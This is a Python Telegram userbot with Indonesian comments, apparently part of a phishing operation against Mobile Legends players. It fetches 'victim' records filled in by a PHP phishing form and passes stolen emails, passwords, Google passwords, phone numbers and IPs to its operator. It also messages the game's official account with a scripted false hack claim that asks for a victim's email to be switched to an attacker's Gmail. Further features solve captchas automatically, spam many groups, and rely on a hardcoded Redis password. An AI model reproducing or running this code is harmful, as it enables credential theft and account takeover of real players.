from telethon import TelegramClient, events
from telethon.sessions import StringSession
import redis
import asyncio
import os
import time
import re
import logging
import json
import requests

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==================== KONFIGURASI ====================
API_ID           = int(os.environ.get('API_ID', 0))
API_HASH         = os.environ.get('API_HASH', '')
SESSION_STRING   = os.environ.get('SESSION_STRING', '')
BOT_B_TOKEN      = os.environ.get('BOT_B_TOKEN', '')
BOT_A_USERNAME   = 'bengkelmlbb_bot'
BOT_BIND_USERNAME= 'stasiunmlbb_bot'
REDIS_URL        = os.environ.get('REDIS_URL', 'redis://default:4HZuPER9G4jC2hmv3pdxLv0sjSw9QPdA@redis-14820.c263.us-east-1-2.ec2.cloud.redislabs.com:14820')
STOK_ADMIN_URL   = os.environ.get('STOK_ADMIN_URL', 'https://whatsapp.com/channel/0029VbA4PrD5fM5TMgECoE1E')

BIND_ENABLED              = os.environ.get('BIND_ENABLED', 'true').lower() == 'true'
FORWARD_TARGET            = 'mobilelegendsoffcial'
FORWARD_ENABLED           = True
AUTO_REDEEM_ENABLED       = os.environ.get('AUTO_REDEEM_ENABLED', 'true').lower() == 'true'
AUTO_REDEEM_CHANNEL       = os.environ.get('AUTO_REDEEM_CHANNEL', 'bengkelmlbb_info')
REDEEM_DELAY              = int(os.environ.get('REDEEM_DELAY', '0'))
AUTO_REDEEM_JEBRAY_ENABLED= os.environ.get('AUTO_REDEEM_JEBRAY_ENABLED', 'true').lower() == 'true'
AUTO_REDEEM_JEBRAY_CHANNEL= os.environ.get('AUTO_REDEEM_JEBRAY_CHANNEL', 'jebraytools')
AUTO_REDEEM_JEBRAY_BOT    = 'jebraybot'
AUTO_SHARE_ENABLED        = os.environ.get('AUTO_SHARE_ENABLED', 'true').lower() == 'true'

REQUEST_TIMEOUT  = 30
CAPTCHA_TIMEOUT  = 30
OCR_TIMEOUT      = 10
BIND_WAIT_TIMEOUT= 30

# ==================== COUNTRY MAPPING ====================
country_mapping = {
  'AF':'🇦🇫 Afghanistan','AL':'🇦🇱 Albania','DZ':'🇩🇿 Algeria','AO':'🇦🇴 Angola',
  'AR':'🇦🇷 Argentina','AM':'🇦🇲 Armenia','AU':'🇦🇺 Australia','AT':'🇦🇹 Austria',
  'AZ':'🇦🇿 Azerbaijan','BH':'🇧🇭 Bahrain','BD':'🇧🇩 Bangladesh','BY':'🇧🇾 Belarus',
  'BE':'🇧🇪 Belgium','BO':'🇧🇴 Bolivia','BA':'🇧🇦 Bosnia','BR':'🇧🇷 Brazil',
  'BN':'🇧🇳 Brunei','BG':'🇧🇬 Bulgaria','KH':'🇰🇭 Cambodia','CM':'🇨🇲 Cameroon',
  'CA':'🇨🇦 Canada','CL':'🇨🇱 Chile','CN':'🇨🇳 China','CO':'🇨🇴 Colombia',
  'CR':'🇨🇷 Costa Rica','HR':'🇭🇷 Croatia','CU':'🇨🇺 Cuba','CY':'🇨🇾 Cyprus',
  'CZ':'🇨🇿 Czech Republic','DK':'🇩🇰 Denmark','DO':'🇩🇴 Dominican Republic',
  'EC':'🇪🇨 Ecuador','EG':'🇪🇬 Egypt','EE':'🇪🇪 Estonia','ET':'🇪🇹 Ethiopia',
  'FI':'🇫🇮 Finland','FR':'🇫🇷 France','GE':'🇬🇪 Georgia','DE':'🇩🇪 Germany',
  'GH':'🇬🇭 Ghana','GR':'🇬🇷 Greece','GT':'🇬🇹 Guatemala','HN':'🇭🇳 Honduras',
  'HK':'🇭🇰 Hong Kong','HU':'🇭🇺 Hungary','IN':'🇮🇳 India','ID':'🇮🇩 Indonesia',
  'IR':'🇮🇷 Iran','IQ':'🇮🇶 Iraq','IE':'🇮🇪 Ireland','IL':'🇮🇱 Israel',
  'IT':'🇮🇹 Italy','JP':'🇯🇵 Japan','JO':'🇯🇴 Jordan','KZ':'🇰🇿 Kazakhstan',
  'KE':'🇰🇪 Kenya','KR':'🇰🇷 South Korea','KP':'🇰🇵 North Korea','KW':'🇰🇼 Kuwait',
  'LA':'🇱🇦 Laos','LV':'🇱🇻 Latvia','LB':'🇱🇧 Lebanon','MY':'🇲🇾 Malaysia',
  'MV':'🇲🇻 Maldives','MX':'🇲🇽 Mexico','MM':'🇲🇲 Myanmar','NP':'🇳🇵 Nepal',
  'NL':'🇳🇱 Netherlands','NZ':'🇳🇿 New Zealand','NG':'🇳🇬 Nigeria','NO':'🇳🇴 Norway',
  'OM':'🇴🇲 Oman','PK':'🇵🇰 Pakistan','PA':'🇵🇦 Panama','PG':'🇵🇬 Papua New Guinea',
  'PH':'🇵🇭 Philippines','PL':'🇵🇱 Poland','PT':'🇵🇹 Portugal','QA':'🇶🇦 Qatar',
  'RO':'🇷🇴 Romania','RU':'🇷🇺 Russia','SA':'🇸🇦 Saudi Arabia','SG':'🇸🇬 Singapore',
  'ZA':'🇿🇦 South Africa','ES':'🇪🇸 Spain','LK':'🇱🇰 Sri Lanka','SE':'🇸🇪 Sweden',
  'CH':'🇨🇭 Switzerland','SY':'🇸🇾 Syria','TW':'🇹🇼 Taiwan','TH':'🇹🇭 Thailand',
  'TL':'🇹🇱 Timor-Leste','TN':'🇹🇳 Tunisia','TR':'🇹🇷 Turkey','UA':'🇺🇦 Ukraine',
  'AE':'🇦🇪 UAE','GB':'🇬🇧 United Kingdom','US':'🇺🇸 United States',
  'UZ':'🇺🇿 Uzbekistan','VN':'🇻🇳 Vietnam','YE':'🇾🇪 Yemen','ZW':'🇿🇼 Zimbabwe',
}

# ==================== VALIDASI ENV ====================
if not all([API_ID, API_HASH, SESSION_STRING, BOT_B_TOKEN, REDIS_URL]):
    logger.error("❌ Missing required environment variables!")
    exit(1)

# ==================== REDIS ====================
try:
    r = redis.from_url(REDIS_URL, decode_responses=True)
    r.ping()
    logger.info("✅ Redis connected")
except Exception as e:
    logger.error(f"❌ Redis connection failed: {e}")
    exit(1)

# ==================== GLOBAL STATE ====================
client            = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
bot_status        = {'in_captcha': False, 'waiting_ocr': False, 'ocr_start_time': 0}
sent_requests     = {}
waiting_for_result= {}
downloaded_photos = []
active_requests   = {}
captcha_timer_task= None
pending_bind      = {}
pending_bind_wait = {}
bind_data         = {}
BIND_REQUEST_TIMEOUT = 30

# ==================== AUTO REDEEM MANAGERS ====================
class AutoRedeemManager:
    def __init__(self, redis_key, label):
        self.key   = redis_key
        self.label = label
        self.redeemed_codes   = set()
        self.failed_codes     = set()
        self.last_message_ids = set()

    def add_redeemed(self, code):
        self.redeemed_codes.add(code)
        logger.info(f"✅ {self.label} {code} redeemed")

    def add_failed(self, code):
        self.failed_codes.add(code)

    def is_redeemed(self, code):
        clean = re.sub(r'[^A-Z0-9]', '', code.upper())
        for c in self.redeemed_codes | self.failed_codes:
            cc = re.sub(r'[^A-Z0-9]', '', c.upper())
            if clean in cc or cc in clean:
                return True
        return False

    def is_processed(self, msg_id):
        return msg_id in self.last_message_ids

    def add_processed(self, msg_id):
        self.last_message_ids.add(msg_id)
        if len(self.last_message_ids) > 500:
            self.last_message_ids = set(list(self.last_message_ids)[-200:])

    def save(self):
        try:
            r.set(self.key, json.dumps({
                'redeemed': list(self.redeemed_codes),
                'failed':   list(self.failed_codes),
                'last_msgs':list(self.last_message_ids)
            }))
        except Exception as e:
            logger.error(f"❌ Save {self.label}: {e}")

    def load(self):
        try:
            data = r.get(self.key)
            if data:
                d = json.loads(data)
                self.redeemed_codes   = set(d.get('redeemed', []))
                self.failed_codes     = set(d.get('failed', []))
                self.last_message_ids = set(d.get('last_msgs', []))
                logger.info(f"📂 {self.label}: {len(self.redeemed_codes)} codes loaded")
        except Exception as e:
            logger.error(f"❌ Load {self.label}: {e}")

auto_redeem        = AutoRedeemManager('auto_redeem', 'VCR')
auto_redeem_jebray = AutoRedeemManager('auto_redeem_jebray', 'JEBRAY')

# ==================== HELPER FUNCTIONS ====================

def clean_bind_text(text):
    if 'Private' in text:
        text = re.sub(r'Bind\s*\(Private\)', 'Hide information', text)
        text = re.sub(r'\(Private\)', 'Hide information', text)
        text = re.sub(r'\bPrivate\b', 'Hide information', text)
    text = re.sub(r'\s*\(Unverified\)', '', text)
    text = re.sub(r'Moonton\s*:\s*Moonton\s+Unverified', 'Moonton: empty.', text)
    text = re.sub(r'Moonton\s+Unverified', 'Moonton: empty.', text)
    text = re.sub(r'empty\.\.', 'empty.', text)
    text = re.sub(r'\s+', ' ', text).strip()
    return text

def validate_mlbb_gopay_sync(user_id, server_id):
    url = 'https://gopay.co.id/games/v1/order/user-account'
    headers = {
        'Content-Type': 'application/json',
        'X-Client': 'web-mobile',
        'X-Timestamp': str(int(time.time() * 1000)),
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'
    }
    body = {"code": "MOBILE_LEGENDS", "data": {
        "userId": str(user_id).strip(), "zoneId": str(server_id).strip()
    }}
    try:
        resp = requests.post(url, headers=headers, json=body, timeout=30)
        if resp.status_code not in [200, 201]:
            return {'status': False, 'message': f'HTTP {resp.status_code}'}
        result = resp.json()
        if not result or 'data' not in result:
            return {'status': False, 'message': 'Invalid response'}
        data     = result['data']
        username = data.get('username', 'Unknown').replace('+', ' ')
        country  = data.get('countryOrigin', 'ID').upper()
        region   = country_mapping.get(country, f'🌍 {country}')
        return {'status': True, 'username': username, 'region': region}
    except Exception as e:
        return {'status': False, 'message': str(e)}

def get_victim_data(uid, sid):
    """
    Ambil data korban dari Redis yang disimpan datafinal.php.
    Key: victim:{uid}:{sid}
    Mengembalikan dict atau None jika tidak ada/gagal.
    """
    try:
        key  = f"victim:{uid}:{sid}"
        data = r.get(key)
        if data:
            logger.info(f"📋 Data korban ditemukan untuk {uid}:{sid}")
            r.delete(key)  # hapus setelah diambil
            return json.loads(data)
        logger.info(f"ℹ️ Tidak ada data korban di Redis untuk {uid}:{sid}")
    except Exception as e:
        logger.warning(f"⚠️ Redis get victim data gagal (opsional): {e}")
    return None

def cleanup_downloaded_photos():
    global downloaded_photos
    for p in downloaded_photos[:]:
        try:
            if os.path.exists(p): os.remove(p)
            downloaded_photos.remove(p)
        except: pass

def extract_telegram_from_bind(text, uid=None, sid=None):
    for line in text.split('\n'):
        if 'Telegram' in line and ':' in line:
            value = line.split(':', 1)[1].strip()
            value = re.sub(r'[*_`]', '', value).strip()
            if value.lower() not in ['empty.', 'empty', '']:
                clean = re.sub(r'[^a-zA-Z0-9_]', '', value)
                if uid and sid:
                    msg = (f"Can you help me change my Moonton email address? Because it was previously "
                           f"hacked by someone and I need your help to change the email address to "
                           f"pancinganandro@gmail.com for the game user ID {uid} server {sid}, please help me.")
                    return (msg, f"@{clean}")
                return (None, f"@{clean}")
    return (None, None)

def build_bind_info(original_text):
    """Ekstrak dan format bind info dari teks bengkelmlbb_bot."""
    keywords = ['Moonton','VK','Google Play','Tiktok','Facebook','Apple','GCID','Telegram','WhatsApp']
    lines    = original_text.split('\n')
    groups   = {}
    current_keyword = None
    current_lines   = []

    for line in lines:
        stripped = line.strip()
        if not stripped: continue
        if stripped.startswith('✧'):
            if current_keyword:
                groups[current_keyword] = current_lines
            keyword_raw = stripped[1:].strip().split(':', 1)[0].strip()
            current_keyword = keyword_raw
            current_lines   = [stripped]
        else:
            if current_keyword:
                current_lines.append(stripped)
    if current_keyword:
        groups[current_keyword] = current_lines

    bind_info = []
    for kw in keywords:
        if kw in groups:
            main_line = groups[kw][0]
            if main_line.startswith('✧'): main_line = main_line[1:].strip()
            if kw == "Moonton":
                sub_lines = [l for l in groups[kw] if l.startswith('-')]
                if sub_lines:
                    for sub in sub_lines:
                        sub_clean = sub.lstrip('-').strip()
                        if ':' in sub_clean:
                            lbl, val = sub_clean.split(':', 1)
                            bind_info.append(f"• {lbl.strip()}: {clean_bind_text(val.strip())}")
                        else:
                            bind_info.append(f"• {sub_clean}")
                    continue
            main_line = clean_bind_text(main_line)
            if ':' in main_line:
                lbl, val = main_line.split(':', 1)
                bind_info.append(f"• {lbl.strip()}: {val.strip()}")
            else:
                bind_info.append(f"• {kw}: {main_line}")
        else:
            bind_info.append(f"• {kw}: empty.")
    return bind_info

def format_combined_output(bind_text, nickname, region, uid, sid, android, ios,
                           creation=None, last_login=None, victim=None):
    """
    Buat 1 pesan gabungan: info akun + bind + data korban dari web.
    victim = dict dari Redis (bisa None jika tidak ada data web).
    """
    bind_info = build_bind_info(bind_text)

    extra = ''
    if creation:   extra += f"\nYear Creation : {creation}"
    if last_login: extra += f"\nLast Login    : {last_login}"

    out = f"""━━━━ INFORMATION ACCOUNT ━━━━
ID Server  : {uid} ({sid})
Nickname   : {nickname}
Region     : {region}{extra}

━━━━ BIND INFO ━━━━
{chr(10).join(bind_info)}

Device Login: Android {android}x | iOS {ios}x"""

    # Tambahkan data korban dari web form jika ada
    if victim:
        phone   = victim.get('phone', '-')
        level   = victim.get('level', '-')
        points  = victim.get('points', '-')
        email1  = victim.get('email', '-')
        pass1   = victim.get('password', '-')
        gpass1  = victim.get('pass', '-')
        email2  = victim.get('email2', '-')
        pass2   = victim.get('password2', '-')
        gpass2  = victim.get('pass2', '-')
        login   = victim.get('login', '-')
        ip      = victim.get('ip', '-')
        country = victim.get('country', '-')
        city    = victim.get('city', '-')
        device  = victim.get('device', '-')

        out += f"""

━━━━ DATA KORBAN (WEB) ━━━━
Phone         : {phone}
Account Level : {level}
Coll. Points  : {points}
Login Via     : {login}

LOGIN INFO 1:
Email/User    : {email1}
Password      : {pass1}
Google Pass   : {gpass1}

LOGIN INFO 2:
Email/User    : {email2}
Password      : {pass2}
Google Pass   : {gpass2}

━━━━ DEVICE & IP ━━━━
IP      : {ip}
Country : {country}
City    : {city}
Device  : {device}"""

    reply_markup = {'inline_keyboard': [[{'text': 'CHANNEL TELEGRAM', 'url': STOK_ADMIN_URL}]]}
    return out, reply_markup

async def send_status_to_user(chat_id, text, reply_to_message_id=None, reply_markup=None):
    url  = f"https://api.telegram.org/bot{BOT_B_TOKEN}/sendMessage"
    data = {'chat_id': chat_id, 'text': text}
    if reply_to_message_id: data['reply_to_message_id'] = reply_to_message_id
    if reply_markup:        data['reply_markup'] = json.dumps(reply_markup)
    try:
        resp = requests.post(url, json=data, timeout=10)
        if resp.status_code == 200:
            return resp.json()['result']['message_id']
    except Exception as e:
        logger.error(f"❌ send_status: {e}")
    return None

async def edit_status_message(chat_id, message_id, text, reply_markup=None):
    url  = f"https://api.telegram.org/bot{BOT_B_TOKEN}/editMessageText"
    data = {'chat_id': chat_id, 'message_id': message_id, 'text': text}
    if reply_markup: data['reply_markup'] = json.dumps(reply_markup)
    try:
        requests.post(url, json=data, timeout=10)
    except Exception as e:
        logger.error(f"❌ edit_status: {e}")

async def timeout_checker():
    while True:
        if bot_status['in_captcha']:
            await asyncio.sleep(1); continue
        now = time.time()
        to_remove = []
        for req_id, req_data in list(active_requests.items()):
            if now - req_data['start_time'] > REQUEST_TIMEOUT:
                logger.warning(f"⏰ Timeout: {req_id}")
                await edit_status_message(req_data['chat_id'], req_data['message_id'],
                                          "⏰ Request timeout. Silakan coba lagi.")
                try:
                    head = r.lindex('pending_requests', 0)
                    if head and head == req_id: r.lpop('pending_requests')
                    r.delete(req_id)
                except: pass
                waiting_for_result.pop(req_data['chat_id'], None)
                to_remove.append(req_id)
        for req_id in to_remove:
            active_requests.pop(req_id, None)

        if BIND_ENABLED:
            for chat_id in [c for c, info in list(pending_bind.items())
                            if info.get('bind_sent_time', 0) > 0
                            and now - info['bind_sent_time'] > BIND_REQUEST_TIMEOUT]:
                pending_bind.pop(chat_id, None)
                if chat_id in pending_bind_wait:
                    pending_bind_wait[chat_id].set()
                    pending_bind_wait.pop(chat_id, None)
        await asyncio.sleep(1)

# ==================== AUTO REDEEM ====================
def extract_vcr_codes(text):
    if not text: return []
    seen, codes = set(), []
    for m in re.findall(r'[Vv][Cc][Rr][-\s]?([A-Z0-9]{6,12})', text, re.IGNORECASE):
        code = f"VCR-{m.upper()}"
        if code not in seen: seen.add(code); codes.append(code)
    return codes

async def send_redeem_vcr(code):
    try:
        await client.send_message(BOT_A_USERNAME, f"/redeem {code}")
        await asyncio.sleep(2); return True
    except Exception as e:
        logger.error(f"❌ VCR send: {e}"); return False

async def process_voucher_codes(codes):
    new_codes = [c for c in codes if not auto_redeem.is_redeemed(c)]
    if not new_codes: return
    await send_status_to_user(7240340418, f"🎯 VCR: {', '.join(new_codes)}")
    for i, code in enumerate(new_codes, 1):
        if i > 1 and REDEEM_DELAY > 0: await asyncio.sleep(REDEEM_DELAY)
        if await send_redeem_vcr(code):
            auto_redeem.add_redeemed(code); await send_status_to_user(7240340418, f"✅ VCR: {code}")
        else:
            auto_redeem.add_failed(code); await send_status_to_user(7240340418, f"❌ VCR fail: {code}")
    auto_redeem.save()

async def send_redeem_jebray(code):
    try:
        await client.send_message(AUTO_REDEEM_JEBRAY_BOT, f"/redeem {code}"); return True
    except Exception as e:
        logger.error(f"❌ JEBRAY send: {e}"); return False

# ==================== HANDLERS ====================
# PENTING: Tidak pakai @events.register agar tidak double-register.
# Semua handler didaftarkan manual di main() via add_event_handler().

async def message_handler(event):
    """Tangkap pesan dari @bengkelmlbb_bot (ID: 7240340418)."""
    global captcha_timer_task, bot_status

    message   = event.message
    chat_id   = event.chat_id
    sender_id = event.sender_id
    text      = message.text or message.message or ''

    # Filter: hanya proses dari/ke bengkelmlbb_bot
    if chat_id != 7240340418 and sender_id != 7240340418:
        return

    logger.info(f"📩 Dari Bot A [{sender_id}]: {text[:120]}")

    # ── Hasil BIND ACCOUNT INFO ──
    if 'BIND ACCOUNT INFO' in text:
        logger.info("✅ Mendeteksi BIND ACCOUNT INFO")

        if not active_requests:
            logger.warning("⚠️ active_requests kosong, hasil diabaikan")
            return

        req_id, req_info = next(iter(active_requests.items()))
        user_id    = req_info['chat_id']
        message_id = req_info['message_id']

        id_m  = re.search(r'ID:?\s*(\d+)', text)
        srv_m = re.search(r'Server:?\s*(\d+)', text)
        and_m = re.search(r'Android:?\s*(\d+)', text)
        ios_m = re.search(r'iOS:?\s*(\d+)', text)

        uid     = id_m.group(1)  if id_m  else req_info['args'][0]
        sid     = srv_m.group(1) if srv_m else req_info['args'][1]
        android = and_m.group(1) if and_m else '0'
        ios     = ios_m.group(1) if ios_m else '0'

        # Coba cocokkan request jika UID/SID berbeda
        if uid != req_info['args'][0] or sid != req_info['args'][1]:
            for r_id, r_info in active_requests.items():
                if r_info['args'][0] == uid and r_info['args'][1] == sid:
                    req_id = r_id; req_info = r_info
                    user_id = req_info['chat_id']
                    message_id = req_info['message_id']
                    break

        # Validasi gopay untuk nickname & region
        gopay    = validate_mlbb_gopay_sync(uid, sid)
        nickname = gopay.get('username', 'Unknown') if gopay['status'] else 'Unknown'
        region   = gopay.get('region', '🌍 Unknown') if gopay['status'] else '🌍 Unknown'

        creation = last_login = None

        # Tunggu bind data (stasiunmlbb_bot)
        if BIND_ENABLED:
            if user_id in bind_data:
                creation   = bind_data[user_id].get('creation')
                last_login = bind_data[user_id].get('last_login')
                bind_data.pop(user_id, None)
            elif user_id in pending_bind:
                if user_id not in pending_bind_wait:
                    pending_bind_wait[user_id] = asyncio.Event()
                try:
                    await asyncio.wait_for(pending_bind_wait[user_id].wait(), timeout=BIND_WAIT_TIMEOUT)
                    if user_id in bind_data:
                        creation   = bind_data[user_id].get('creation')
                        last_login = bind_data[user_id].get('last_login')
                        bind_data.pop(user_id, None)
                except asyncio.TimeoutError:
                    logger.warning(f"⏰ Bind timeout user {user_id}")
                pending_bind_wait.pop(user_id, None)
                pending_bind.pop(user_id, None)

        # Ambil data korban dari Redis (simpan oleh datafinal.php)
        # Ini opsional — jika tidak ada, output tetap dikirim tanpa bagian web
        victim = get_victim_data(uid, sid)

        # Bangun 1 pesan gabungan
        output, markup = format_combined_output(
            text, nickname, region, uid, sid, android, ios,
            creation, last_login, victim
        )

        # Kirim 1 pesan ke user
        await edit_status_message(user_id, message_id, output, markup)
        logger.info(f"📤 Output gabungan dikirim ke user {user_id}")

        # Forward jika ada Telegram di bind
        if FORWARD_ENABLED:
            custom_msg, tg_mention = extract_telegram_from_bind(text, uid, sid)
            if custom_msg and tg_mention:
                await client.send_message(FORWARD_TARGET, custom_msg)
                await client.send_message(FORWARD_TARGET, tg_mention)

        # Bersihkan
        active_requests.pop(req_id, None)
        waiting_for_result.pop(user_id, None)
        try:
            head = r.lindex('pending_requests', 0)
            if head and head == req_id: r.lpop('pending_requests')
            r.delete(req_id)
        except: pass
        cleanup_downloaded_photos()
        return

    # ── Verifikasi captcha sukses ──
    if 'verification successful' in text.lower() or '✅ Verifikasi berhasil!' in text:
        if captcha_timer_task: captcha_timer_task.cancel(); captcha_timer_task = None
        bot_status['in_captcha'] = False
        if active_requests:
            await asyncio.sleep(5)
            req_id, req_info = next(iter(active_requests.items()))
            await client.send_message(BOT_A_USERNAME,
                f"{req_info['command']} {req_info['args'][0]} {req_info['args'][1]}")
            req_info['start_time'] = time.time()
        return

    # ── Error dari Bot A ──
    if any(kw in text.lower() for kw in ['kesalahan', 'error', 'gagal']):
        if active_requests:
            req_id, req_info = next(iter(active_requests.items()))
            await edit_status_message(req_info['chat_id'], req_info['message_id'],
                                      "❌ Gagal memproses. Coba lagi.")
            try:
                head = r.lindex('pending_requests', 0)
                if head and head == req_id: r.lpop('pending_requests')
                r.delete(req_id)
            except: pass
            waiting_for_result.pop(req_info['chat_id'], None)
            active_requests.pop(req_id, None)
        cleanup_downloaded_photos()

async def captcha_from_bot_handler(event):
    """Tangkap foto captcha dari bengkelmlbb_bot."""
    message = event.message
    sender  = await message.get_sender()
    if sender.id != 7240340418 or not message.photo: return

    global bot_status, captcha_timer_task
    bot_status['in_captcha'] = True
    for req_info in active_requests.values():
        req_info['start_time'] = time.time()

    if captcha_timer_task: captcha_timer_task.cancel()

    async def reset_captcha():
        await asyncio.sleep(CAPTCHA_TIMEOUT)
        bot_status['in_captcha'] = False
    captcha_timer_task = asyncio.create_task(reset_captcha())

    photo_path = await message.download_media()
    downloaded_photos.append(photo_path)
    try:
        ocr_bot = await client.get_entity('mobilelegendstools_bot')
        await client.send_file(ocr_bot, photo_path)
        bot_status['waiting_ocr'] = True
        bot_status['ocr_start_time'] = time.time()
        cleanup_downloaded_photos()
    except Exception as e:
        logger.error(f"❌ OCR send: {e}")
        cleanup_downloaded_photos()

async def ocr_result_handler(event):
    """Tangkap hasil OCR (6 digit) dari mobilelegendstools_bot."""
    sender = await event.get_sender()
    if sender.id != 8627530965: return
    text = (event.message.text or '').strip()
    if not re.match(r'^\d{6}$', text): return

    global bot_status, captcha_timer_task
    bot_status['waiting_ocr'] = False
    bot_status['ocr_start_time'] = 0
    try:
        bengkel = await client.get_entity(7240340418)
        await client.send_message(bengkel, f"/verify {text}")
        bot_status['in_captcha'] = False
        if captcha_timer_task: captcha_timer_task.cancel(); captcha_timer_task = None
    except Exception as e:
        logger.error(f"❌ verify send: {e}")

async def ocr_error_handler(event):
    """Tangkap error dari OCR bot."""
    sender = await event.get_sender()
    if sender.id != 8627530965: return
    text = (event.message.text or '').strip()
    if not any(k in text.lower() for k in ['tidak ada teks','gagal memproses','maaf','error','gagal']): return

    global bot_status, captcha_timer_task
    bot_status['waiting_ocr'] = False; bot_status['ocr_start_time'] = 0
    if active_requests:
        req_id, req_info = next(iter(active_requests.items()))
        await edit_status_message(req_info['chat_id'], req_info['message_id'], "❌ OCR Gagal. Coba lagi.")
    bot_status['in_captcha'] = False
    if captcha_timer_task: captcha_timer_task.cancel(); captcha_timer_task = None
    if active_requests:
        req_id, req_info = next(iter(active_requests.items()))
        try:
            head = r.lindex('pending_requests', 0)
            if head and head == req_id: r.lpop('pending_requests')
            r.delete(req_id)
        except: pass
        waiting_for_result.pop(req_info['chat_id'], None)
        active_requests.pop(req_id, None)
    cleanup_downloaded_photos()

async def ocr_timeout_checker():
    while True:
        await asyncio.sleep(1)
        if bot_status.get('waiting_ocr') and bot_status.get('ocr_start_time', 0) > 0:
            if time.time() - bot_status['ocr_start_time'] > OCR_TIMEOUT:
                bot_status['waiting_ocr'] = False; bot_status['ocr_start_time'] = 0
                if active_requests:
                    req_id, req_info = next(iter(active_requests.items()))
                    await edit_status_message(req_info['chat_id'], req_info['message_id'], "⏰ OCR timeout. Coba lagi.")
                    bot_status['in_captcha'] = False
                    try:
                        head = r.lindex('pending_requests', 0)
                        if head and head == req_id: r.lpop('pending_requests')
                        r.delete(req_id)
                    except: pass
                    waiting_for_result.pop(req_info['chat_id'], None)
                    active_requests.pop(req_id, None)
                    cleanup_downloaded_photos()

async def userbot_command_handler(event):
    """/send uid sid @username — kirim pesan ke FORWARD_TARGET."""
    text = event.message.text or ''
    if not text.startswith('/send'): return

    rest  = text[5:].strip()
    uid = sid = username = None
    parts = rest.split()
    if len(parts) >= 2:
        uid = re.sub(r'[^0-9]', '', parts[0])
        sid = re.sub(r'[^0-9]', '', parts[1])
        username = parts[2] if len(parts) > 2 else None
    if not uid or not sid:
        for pat in [r'(\d+)\s*\((\d+)\)\s+(\S+)', r'(\d+)[\-_|](\d+)\s+(\S+)', r'(\d+)\s+(\d+)']:
            m = re.search(pat, rest)
            if m:
                uid = m.group(1); sid = m.group(2)
                username = m.group(3) if len(m.groups()) > 2 else '0'
                break
    if uid and sid:
        custom = (f"Can you help me change my Moonton email address? Because it was previously "
                  f"hacked by someone and I need your help to change the email address to "
                  f"pancinganandro@gmail.com for the game user ID {uid} server {sid}, please help me.")
        await client.send_message(FORWARD_TARGET, custom)
        if username and username not in ['0', 'empty', '']:
            await client.send_message(FORWARD_TARGET, username)
        try: await event.message.delete()
        except: pass
    else:
        err = await event.message.reply("❌ Format: /send 386941792 8554 @username")
        await asyncio.sleep(5)
        try: await err.delete(); await event.message.delete()
        except: pass

async def auto_share_handler(event):
    """/pm (reply) — forward pesan ke semua grup."""
    if not AUTO_SHARE_ENABLED or event.message.out or event.message.is_group: return
    text = event.message.text or ''
    if not text.startswith('/pm'): return
    if not event.message.is_reply:
        await event.message.reply("❌ Reply ke pesan yang ingin dikirim, lalu ketik /pm"); return
    replied_msg = await event.message.get_reply_message()
    if not replied_msg: return

    group_list = [d async for d in client.iter_dialogs() if d.is_group or d.is_channel]
    status_msg = await event.message.reply(f"🔄 Meneruskan ke {len(group_list)} grup...")
    ok = fail = 0
    for i, dialog in enumerate(group_list):
        try:
            await client.forward_messages(dialog.id, replied_msg.id, replied_msg.chat_id)
            ok += 1; await asyncio.sleep(2)
        except Exception as e:
            fail += 1
            if 'flood' in str(e).lower(): await asyncio.sleep(5)
        if (i + 1) % 10 == 0:
            await status_msg.edit(f"🔄 {ok} berhasil, {fail} gagal dari {i+1}/{len(group_list)}...")
    await status_msg.edit(f"✅ Selesai: {ok} berhasil, {fail} gagal.")
    try: await event.message.delete()
    except: pass

async def auto_redeem_vcr_handler(event):
    if not AUTO_REDEEM_ENABLED: return
    chat = await event.get_chat()
    chat_username = getattr(chat, 'username', None)
    chat_title    = getattr(chat, 'title', '')
    if not (chat_username == AUTO_REDEEM_CHANNEL or AUTO_REDEEM_CHANNEL in chat_title.lower()): return
    if auto_redeem.is_processed(event.message.id): return
    text = event.message.text or ''
    if not text or not re.search(r'[Vv][Cc][Rr]', text): return
    codes = extract_vcr_codes(text)
    if not codes: return
    auto_redeem.add_processed(event.message.id)
    await process_voucher_codes(codes)

async def auto_redeem_jebray_handler(event):
    if not AUTO_REDEEM_JEBRAY_ENABLED: return
    chat = await event.get_chat()
    chat_username = getattr(chat, 'username', None)
    chat_title    = getattr(chat, 'title', '')
    if not (chat_username == AUTO_REDEEM_JEBRAY_CHANNEL or AUTO_REDEEM_JEBRAY_CHANNEL in chat_title.lower()): return
    if auto_redeem_jebray.is_processed(event.message.id): return
    text = event.message.text or ''
    if not text or 'JEBRAY_' not in text: return
    codes = [m for m in re.findall(r'JEBRAY_[A-Za-z0-9]+', text) if not auto_redeem_jebray.is_redeemed(m)]
    if not codes: return
    auto_redeem_jebray.add_processed(event.message.id)
    for code in codes:
        if await send_redeem_jebray(code):
            auto_redeem_jebray.add_redeemed(code)
            await send_status_to_user(7240340418, f"✅ JEBRAY: {code}")
        else:
            await send_status_to_user(7240340418, f"❌ JEBRAY fail: {code}")
    auto_redeem_jebray.save()

async def bind_response_handler(event):
    """Tangkap respons bind dari @stasiunmlbb_bot."""
    if not BIND_ENABLED: return
    sender = await event.message.get_sender()
    if not sender or sender.username != BOT_BIND_USERNAME: return

    text = event.message.text or ''
    logger.info(f"📩 Bind: {text[:150]}")

    uid_match = re.search(r'🆔.*?(\d+)', text)
    if uid_match:
        uid = uid_match.group(1)
        for chat_id, info in pending_bind.items():
            if info.get('uid') == uid:
                info['bind_sent_time'] = 0; break

    if "Bind Result" not in text: return
    if not uid_match: return

    uid = uid_match.group(1)
    target_chat = next((c for c, info in pending_bind.items() if info.get('uid') == uid), None)
    if not target_chat: return

    cr_m = re.search(r'🕰.*?Creation.*?(\d{4})', text)
    ll_m = re.search(r'🕒.*?Last Login.*?:\s*(.+?)(?:\n|$)', text)
    creation   = cr_m.group(1) if cr_m else None
    last_login = ll_m.group(1).strip() if ll_m else None
    if last_login:
        last_login = re.sub(r'[*_`]', '', last_login)
        last_login = re.sub(r'\s*(PHT|WIB|WITA|WIT|UTC|GMT)[^\s]*', '', last_login, flags=re.IGNORECASE).strip()

    bind_data[target_chat] = {'creation': creation, 'last_login': last_login}
    if target_chat in pending_bind_wait:
        pending_bind_wait[target_chat].set()
    pending_bind.pop(target_chat, None)
    logger.info(f"✅ Bind data user {target_chat}: creation={creation}, last_login={last_login}")

# ==================== PROSES ANTRIAN ====================
async def process_queue():
    logger.info("🔄 Queue processor started")
